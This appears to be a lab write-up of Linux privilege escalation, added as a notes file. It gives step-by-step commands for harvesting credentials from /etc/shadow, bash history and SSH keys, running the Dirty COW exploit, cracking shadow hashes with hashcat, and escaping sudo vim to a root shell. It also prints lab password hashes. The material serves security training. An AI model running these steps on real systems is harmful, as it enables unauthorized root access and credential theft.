@@ -1,0 +1,133 @@
+
+System Enumeration:
+
+We can use the following command to get details about the running operating system: uname -a 
+
+cat /proc/version will give us info about the version of the OS.
+
+We can see info about the CPU by: lscpu. This will help us with some exploits as some exploits require certain number of cores.
+
+We can see what services are running by: ps aux .
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+User Enumeration:
+
+We can see what privilages are available to the current user by : sudo -l
+
+We can see the list of users by: cat /etc/passwd | cut -d : -f 1
+
+We can see how vulnerable this machine is by trying to execute this command: cat /etc/shadow. This will reveal the password hashes for each user. This should only be available for admin users only.
+
+We can also check for the history of the command prompt by: history . 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Network Enumeration:
+
+We can show the ARP (Address Resolution Protocol) cache by: ip neigh
+
+We can list all of the open ports by: netstat -ano
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Password Enumeration:
+
+We can get all of the files that has the word password in their content and highlight the foundings in red with this command: grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
+
+We can search for files that have the word password in their names by: locate password .
+
+We can also search for ssh keys which can help us to connect to another machine within the same network: find / -name id_rsa 2>/dev/null
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Using Automation tools:
+
+We will use linPease, which is similar to the tool winPease which is for windows. This machine has this tool already installed in /home/tools/linpeas
+
+We change the directory and run linpeas.sh:./linpeas.sh
+
+This revealed a lot of vulnerabilities. 
+
+Next, we run the exploit suggester tool . This came up with a lot of exploits as well.
+
+The exploit that we are going to use is called dirty cow.
+
+It is already installed on the machine but we can download the file from here: https://github.com/firefart/dirtycow/blob/master/dirty.c
+
+we change the directory where the dirtry cow tool is installed and we run it like so: gcc -pthread c0w.c -o cow
+
+Then, we run the exploit: ./cow
+
+After finishing executing, if we typed passwd, we will be the user root.
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escalation via stored passwords:
+
+In the home directory, if we listed the hidden files: ls -la, we will see the file that contains the bash history. We can see its content by: cat .bash_history . We can easily get the bash history by just typing history
+
+If we scrolled up a little bit, we can see a password: password123 .  We can try and login as root: sudo root, and we provide the password that we found. Indeed we are now root.
+
+Also, we tried this command : find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \; , We can find the password at the end of the output
+
+Sometimes however, the answer is right infront of us. In the home directory, if we see the content of the openvpn file, we will see that auth-user-pass is stored at /etc/openvpn/auth.txt .
+
+If we see the content of this file, we will see a user and their password. However, this user doesnt exist anymore.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escalaion via weak flies permisions:
+
+As we have mentioned before, if we tried to read the file /etc/shadow , we will notice that we can indeed read the file. However, this shouldnt be the case as this file includes the hashes of the passwords. 
+
+Since we can read both the passwd file and the shadow file. We can use a tool called unshadow. First we need to save the content of the passwd file in a text file and the content of the shadow file in a seperate text file and save them both in the same directory.
+
+In the same directory, we run unshadow tool like so: unshadow (the password file name) (the shadow file name).
+
+Only save the root and the username which will have a hash next to them
+
+In this case: root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
+TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
+
+We also save this in a text file .
+
+We can identify what type of hash is that by looking at the beginning of the hash. In our case, the hash starts with $6$. We can Google hashcats hash examples and search for the type of hash that starts like our hashes. We indeed find a match and the hash that is being used has the code of 1800
+
+We will use hashcat like so: hashcat -m (hash code) (the file that has the two hashes) rockyou.txt -O .
+
+Note: hashcat is very resource consuming .
+
+This will give us the password that we already got for root.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Privilege Escalation via ssh keys:
+
+
+From Payloads All The Things, to get the ssh key, we can try and run these two commands: find / -name authorized_keys 2> /dev/null and find / -name id_rsa 2> /dev/null . The second one gave us a result which is a file that has the private ssh key . This can be used to login into another server.
+
+We save the content of this file on our machine .
+
+We change the permission of this file: chmod 400 (file name) .
+
+Then, on our machine we do: ssh -oHostKeyAlgorithms=+ssh-dss -i (id_rsa file name) root@(target ip) . Then we provide the root user password which is password123 .
+
+We will be logged in as root on another machine.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Escalation via sudo shell escaping:
+
+We can use a techinque called GTFOBins: https://gtfobins.github.io/ .
+
+Since we have access to vim without having to be root, we can use this command to have a shell as root using vim: sudo vim -c ':!/bin/sh' . And easy  as that, we now running this machine as root.
+
+
+
